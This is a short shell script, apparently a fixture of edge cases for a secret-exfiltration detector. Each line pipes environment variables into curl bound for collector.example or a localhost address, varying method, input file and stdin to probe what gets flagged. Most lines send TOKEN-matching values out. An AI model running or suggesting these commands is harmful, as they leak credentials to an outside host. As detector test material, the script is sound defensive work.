#!/bin/sh
# Other methods, files, local targets and disconnected/redirected stdin.
env | grep -E 'TOKEN' | curl -X GET --data-binary @- https://collector.example/upload
env | grep -E 'TOKEN' | curl --data-binary @public.txt https://collector.example/upload
env | grep -E 'TOKEN' | curl --data-binary @- http://app.localhost/upload
env | grep -E 'PUBLIC' | curl --data-binary @- https://collector.example/upload
env | grep -E 'TOKEN' | curl --data-binary @- https://collector.example/upload < public.txt
env | grep -E 'TOKEN'; printf public | curl --data-binary @- https://collector.example/upload
env | grep -E 'TOKEN' | curl --data public -X GET --data-binary @- https://collector.example/upload
env | grep -E 'TOKEN' | curl --data @- https://first.example/upload -X GET --data-binary @- https://collector.example/upload
